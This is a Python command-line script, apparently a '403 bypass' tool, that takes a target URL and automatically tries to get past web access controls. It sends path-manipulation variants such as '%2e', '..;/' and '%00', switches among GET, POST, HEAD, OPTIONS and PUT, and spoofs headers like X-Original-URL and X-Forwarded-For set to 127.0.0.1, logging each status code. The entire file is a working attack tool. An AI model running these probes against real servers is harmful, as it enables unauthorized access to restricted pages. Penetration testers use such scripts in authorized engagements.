#!/usr/bin/python
# -*- coding:utf-8 -*-

import requests
import logging
import sys,os

logging.basicConfig(format='[%(asctime)s]   %(message)s', level=logging.INFO)
log = logging.getLogger(__name__)


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def print_response_path(url, http_code):
    if http_code in [403,404,500]:
        color = bcolors.FAIL
    elif http_code in [200]:
        color = bcolors.OKGREEN
    else:
        color = bcolors.WARNING
    log.info(f"{color}%40s ---------> [%s]{bcolors.ENDC}", url, http_code)

def print_response_method(url, http_code, method):
    if http_code in [403,404,500]:
        color = bcolors.FAIL
    elif http_code in [200]:
        color = bcolors.OKGREEN
    else:
        color = bcolors.WARNING
    log.info(f"{color}%40s -----[%s]----> [%s]{bcolors.ENDC}", url, method, http_code)

def send_http_request(url, headers={}, timeout=2.0):
    http_response   = requests.get(url, headers=headers, timeout=timeout)
    print_response_path(url, http_response.status_code)

def bypass_with_http_method_switch(url, headers={}, timeout=2.0):
    # GET
    http_response   = requests.get(url, headers=headers, timeout=timeout)
    print_response_method(url, http_response.status_code, "GET")

    # POST
    http_response   = requests.post(url, headers=headers, timeout=timeout, data={})
    print_response_method(url, http_response.status_code, "POST")

    # HEAD
    http_response   = requests.head(url, headers=headers, timeout=timeout, data={})
    print_response_method(url, http_response.status_code, "HEAD")

    # OPTIONS
    http_response   = requests.options(url, headers=headers, timeout=timeout, data={})
    print_response_method(url, http_response.status_code, "OPTIONS")

    # PUT
    http_response   = requests.put(url, headers=headers, timeout=timeout, data={})
    print_response_method(url, http_response.status_code, "PUT")

def bypass_with_path_manipulation(url):
    head, tail = os.path.split(url.strip("/"))

    send_http_request(head + "/" + tail)
    send_http_request(head + "/%2e/" + tail)
    send_http_request(head + "/" + tail + "/")
    send_http_request(head + "/" + tail + "..;/")
    send_http_request(head + "/" + tail + "/..;/")
    send_http_request(head + "/" + tail + "%20")
    send_http_request(head + "/" + tail + "%09")
    send_http_request(head + "/" + tail + "%00")
    send_http_request(head + "/" + tail + "?")
    send_http_request(head + "/" + tail + "??")
    send_http_request(head + "/" + tail + "?param")
    send_http_request(head + "/" + tail + "?param")
    send_http_request(head + "/" + tail + "?param")
    send_http_request(head + "/" + tail + "#")
    send_http_request(head + "/" + tail + "#test")
    send_http_request(head + "//" + tail + "//")
    send_http_request(head + "/" + tail + "/.")
    send_http_request(head + "/./" + tail + "/./")


def bypass_with_http_headers_add(url, headers={}, timeout=2.0):
    head, tail = os.path.split(url.strip("/"))

    headers1 = {"X-Original-URL": "/"+tail}
    http_response   = requests.get(url, headers=headers1, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 1")

    headers2 = {"X-Rewrite-URL": "/"+tail}
    http_response   = requests.get(url, headers=headers2, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 2")

    headers3 = {"X-Custom-IP-Authorization": "127.0.0.1"}
    http_response   = requests.get(url, headers=headers3, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 3")

    headers4 = {"X-Forwarded-For": "127.0.0.1"}
    http_response   = requests.get(url, headers=headers4, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 4")

    headers5 = {"X-Forward-For": "127.0.0.1"}
    http_response   = requests.get(url, headers=headers5, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 5")

    headers6 = {"X-Remote-IP": "127.0.0.1"}
    http_response   = requests.get(url, headers=headers6, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 6")

    headers7 = {"X-Originating-IP": "127.0.0.1"}
    http_response   = requests.get(url, headers=headers7, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 7")

    headers8 = {"X-Remote-Addr": "127.0.0.1"}
    http_response   = requests.get(url, headers=headers8, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 8")

    headers9 = {"X-Client-IP": "127.0.0.1"}
    http_response   = requests.get(url, headers=headers9, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 9")

    headers10 = {"X-Real-IP": "127.0.0.1"}
    http_response   = requests.get(url, headers=headers10, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 10")

    headers11 = {"Content-Length": "0"}
    http_response   = requests.post(url, headers=headers11, timeout=timeout)
    print_response_method(url, http_response.status_code, "Header 11")


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("[*] %s <url>" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]

    # Path Manipulation tests
    bypass_with_path_manipulation(url)

    # Switching method tests
    print("\n")
    bypass_with_http_method_switch(url)
    log.info("Change GET --> TRACE method manually !")

    # Adding header method tests
    print("\n")
    bypass_with_http_headers_add(url)
